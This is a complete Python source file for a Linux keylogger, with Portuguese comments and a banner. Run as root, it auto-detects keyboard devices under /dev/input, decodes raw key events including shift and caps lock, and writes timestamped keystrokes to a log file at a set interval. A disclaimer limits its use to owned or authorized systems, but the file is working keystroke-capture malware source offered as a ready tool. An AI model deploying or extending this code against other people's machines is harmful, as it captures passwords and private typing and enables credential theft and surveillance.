#!/usr/bin/env python3
"""
╔══════════════════════════════════════════╗
║          ADVANCED KEYLOGGER              ║
║   Python puro | /dev/input | Timestamps  ║
╚══════════════════════════════════════════╝
AVISO: Use apenas em sistemas próprios ou com permissão explícita.
Uso (requer root):
  sudo python3 keylogger.py
  sudo python3 keylogger.py --output /tmp/log.txt --interval 30
  sudo python3 keylogger.py --device /dev/input/event0
"""

import sys
import os
import time
import struct
import argparse
import threading
import glob
from datetime import datetime

R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
M="\033[95m"; C="\033[96m"; W="\033[97m"; DIM="\033[2m"; RST="\033[0m"; BOLD="\033[1m"

# ─── Mapa de keycodes Linux → caracteres ──────────────────────────────────────
KEY_MAP = {
    1:"ESC",2:"1",3:"2",4:"3",5:"4",6:"5",7:"6",8:"7",9:"8",10:"9",11:"0",
    12:"-",13:"=",14:"[BKSP]",15:"[TAB]",16:"q",17:"w",18:"e",19:"r",20:"t",
    21:"y",22:"u",23:"i",24:"o",25:"p",26:"[",27:"]",28:"[ENTER]",29:"[CTRL]",
    30:"a",31:"s",32:"d",33:"f",34:"g",35:"h",36:"j",37:"k",38:"l",39:";",
    40:"'",41:"`",42:"[SHIFT]",43:"\\",44:"z",45:"x",46:"c",47:"v",48:"b",
    49:"n",50:"m",51:",",52:".",53:"/",54:"[SHIFT]",55:"*",56:"[ALT]",
    57:" ",58:"[CAPS]",87:"[F11]",88:"[F12]",
    59:"[F1]",60:"[F2]",61:"[F3]",62:"[F4]",63:"[F5]",
    64:"[F6]",65:"[F7]",66:"[F8]",67:"[F9]",68:"[F10]",
    72:"[UP]",75:"[LEFT]",77:"[RIGHT]",80:"[DOWN]",
    83:"[DEL]",96:"[ENTER]",100:"[ALT]",102:"[HOME]",
    103:"[UP]",104:"[PGUP]",105:"[LEFT]",106:"[RIGHT]",
    107:"[END]",108:"[DOWN]",109:"[PGDN]",110:"[INS]",111:"[DEL]",
}

KEY_MAP_SHIFT = {
    2:"!",3:"@",4:"#",5:"$",6:"%",7:"^",8:"&",9:"*",10:"(",11:")",
    12:"_",13:"+",16:"Q",17:"W",18:"E",19:"R",20:"T",21:"Y",22:"U",
    23:"I",24:"O",25:"P",26:"{",27:"}",30:"A",31:"S",32:"D",33:"F",
    34:"G",35:"H",36:"J",37:"K",38:"L",39:":",40:'"',41:"~",43:"|",
    44:"Z",45:"X",46:"C",47:"V",48:"B",49:"N",50:"M",51:"<",52:">",53:"?",
}

def print_banner():
    print(f"""
{Y}╔{'═'*50}╗
║  {W}{BOLD}██╗  ██╗███████╗██╗   ██╗██╗      {Y}║
║  {W}{BOLD}██║ ██╔╝██╔════╝╚██╗ ██╔╝██║      {Y}║
║  {W}{BOLD}█████╔╝ █████╗   ╚████╔╝ ██║      {Y}║
║  {W}{BOLD}██╔═██╗ ██╔══╝    ╚██╔╝  ██║      {Y}║
║  {W}{BOLD}██║  ██╗███████╗   ██║   ███████╗ {Y}║
║  {W}{BOLD}╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ {Y}║
║{C}      K E Y L O G G E R              {Y}║
╚{'═'*50}╝{RST}
{DIM}  [*] Apenas em sistemas próprios ou autorizados.{RST}
""")

# ─── Encontra dispositivos de teclado em /dev/input ───────────────────────────
def find_keyboard_devices():
    keyboards = []
    try:
        with open("/proc/bus/input/devices", "r") as f:
            content = f.read()

        blocks = content.split("\n\n")
        for block in blocks:
            if "Keyboard" in block or "keyboard" in block or "kbd" in block.lower():
                for line in block.split("\n"):
                    if line.startswith("H: Handlers="):
                        handlers = line.split("=")[1].split()
                        for h in handlers:
                            if h.startswith("event"):
                                path = f"/dev/input/{h}"
                                if os.path.exists(path):
                                    keyboards.append(path)
    except:
        # Fallback: tenta event0 ao event10
        for i in range(11):
            p = f"/dev/input/event{i}"
            if os.path.exists(p):
                keyboards.append(p)
    return keyboards

# ─── Estrutura de evento Linux input ──────────────────────────────────────────
# struct input_event { timeval tv_sec; timeval tv_usec; __u16 type; __u16 code; __s32 value }
EVENT_FORMAT = "llHHI"  # Pode variar entre sistemas 32/64bit
EVENT_SIZE   = struct.calcsize(EVENT_FORMAT)

EV_KEY   = 1
KEY_PRESS   = 1
KEY_REPEAT  = 2

# ─── Keylogger principal ───────────────────────────────────────────────────────
class KeyLogger:
    def __init__(self, device, output_path, flush_interval):
        self.device        = device
        self.output_path   = output_path
        self.flush_interval= flush_interval
        self.buffer        = []
        self.lock          = threading.Lock()
        self.shift_pressed = False
        self.ctrl_pressed  = False
        self.caps_lock     = False
        self.running       = True
        self.total_keys    = 0
        self.session_start = datetime.now()

    def open_device(self):
        try:
            fd = open(self.device, "rb")
            return fd
        except PermissionError:
            print(f"{R}[ERRO] Permissão negada. Execute como root.{RST}")
            sys.exit(1)
        except FileNotFoundError:
            print(f"{R}[ERRO] Dispositivo não encontrado: {self.device}{RST}")
            sys.exit(1)

    def decode_key(self, code):
        if self.shift_pressed:
            ch = KEY_MAP_SHIFT.get(code, KEY_MAP.get(code, f"[{code}]"))
        else:
            ch = KEY_MAP.get(code, f"[{code}]")

        # Caps lock afeta letras
        if self.caps_lock and len(ch) == 1 and ch.isalpha():
            ch = ch.upper() if ch.islower() else ch.lower()

        return ch

    def process_event(self, ev_type, ev_code, ev_value):
        if ev_type != EV_KEY:
            return

        # Detecta modificadores
        if ev_code in (42, 54):  # SHIFT esquerdo/direito
            self.shift_pressed = (ev_value in (KEY_PRESS, KEY_REPEAT))
            return
        if ev_code == 29:  # CTRL
            self.ctrl_pressed = (ev_value in (KEY_PRESS, KEY_REPEAT))
            return
        if ev_code == 58 and ev_value == KEY_PRESS:  # CAPS LOCK toggle
            self.caps_lock = not self.caps_lock
            return

        if ev_value not in (KEY_PRESS, KEY_REPEAT):
            return

        ch = self.decode_key(ev_code)
        ts = datetime.now().strftime("%H:%M:%S")

        with self.lock:
            self.total_keys += 1
            self.buffer.append(ch)

        # Exibe no console
        if ch == "[ENTER]":
            print(f"\n  {DIM}{ts}{RST}", end="", flush=True)
        elif ch.startswith("["):
            print(f"{M}{ch}{RST}", end="", flush=True)
        else:
            print(f"{W}{ch}{RST}", end="", flush=True)

    def flush_to_file(self):
        if not self.output_path:
            return
        with self.lock:
            if not self.buffer:
                return
            content = "".join(self.buffer)
            self.buffer.clear()

        with open(self.output_path, "a", encoding="utf-8") as f:
            f.write(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
            f.write(content + "\n")

    def flush_thread(self):
        while self.running:
            time.sleep(self.flush_interval)
            self.flush_to_file()

    def run(self):
        fd = self.open_device()
        print(f"\n  {G}[*]{RST} Dispositivo : {self.device}")
        print(f"  {G}[*]{RST} Output       : {self.output_path or 'Apenas console'}")
        print(f"  {G}[*]{RST} Flush a cada : {self.flush_interval}s")
        print(f"  {G}[*]{RST} Iniciado     : {self.session_start.strftime('%H:%M:%S')}")
        print(f"  {Y}[*]{RST} Pressione Ctrl+C para parar\n")
        print(f"  {'─'*60}")
        print(f"  {DIM}{datetime.now().strftime('%H:%M:%S')}{RST}", end="", flush=True)

        # Inicia thread de flush
        if self.output_path:
            ft = threading.Thread(target=self.flush_thread, daemon=True)
            ft.start()

        try:
            while self.running:
                raw = fd.read(EVENT_SIZE)
                if not raw or len(raw) < EVENT_SIZE:
                    continue
                try:
                    ev = struct.unpack(EVENT_FORMAT, raw)
                    _, _, ev_type, ev_code, ev_value = ev
                    self.process_event(ev_type, ev_code, ev_value)
                except struct.error:
                    continue

        except KeyboardInterrupt:
            self.running = False
            self.flush_to_file()  # Flush final
            elapsed = (datetime.now() - self.session_start).seconds
            print(f"\n\n{C}{'─'*50}{RST}")
            print(f"{BOLD}  SESSÃO ENCERRADA{RST}")
            print(f"{C}{'─'*50}{RST}")
            print(f"  Duração     : {elapsed}s")
            print(f"  Total teclas: {self.total_keys}")
            if self.output_path:
                print(f"  Log salvo   : {G}{self.output_path}{RST}")
        finally:
            fd.close()

# ─── Main ──────────────────────────────────────────────────────────────────────
def main():
    print_banner()

    if not sys.platform.startswith("linux"):
        print(f"{R}[AVISO] Este keylogger usa /dev/input (Linux only).{RST}")
        print(f"  No Windows, seria necessário usar ctypes + WH_KEYBOARD_LL.")
        print(f"  Implementação Linux ativa.\n")

    parser = argparse.ArgumentParser(description="Advanced Keylogger — Python puro (Linux)")
    parser.add_argument("--device",   default=None, help="Dispositivo: /dev/input/eventX")
    parser.add_argument("--output",   default=None, help="Arquivo de saída para o log")
    parser.add_argument("--interval", type=int, default=15, help="Intervalo de flush em segundos")
    parser.add_argument("--list",     action="store_true", help="Listar dispositivos disponíveis")
    args = parser.parse_args()

    # Listar dispositivos
    if args.list:
        print(f"  {B}Dispositivos de teclado detectados:{RST}")
        devs = find_keyboard_devices()
        if devs:
            for d in devs:
                print(f"  {G}→{RST} {d}")
        else:
            print(f"  {R}Nenhum teclado encontrado em /dev/input/{RST}")
        return

    # Auto detectar dispositivo
    device = args.device
    if not device:
        devs = find_keyboard_devices()
        if devs:
            device = devs[0]
            print(f"  {Y}[*]{RST} Auto-detectado: {device}")
            if len(devs) > 1:
                print(f"  {DIM}    Outros: {', '.join(devs[1:])}{RST}")
        else:
            print(f"{R}[ERRO] Nenhum dispositivo encontrado. Use --device /dev/input/eventX{RST}")
            print(f"  Ou rode: python3 keylogger.py --list")
            sys.exit(1)

    kl = KeyLogger(device, args.output, args.interval)
    kl.run()

if __name__ == "__main__":
    main()
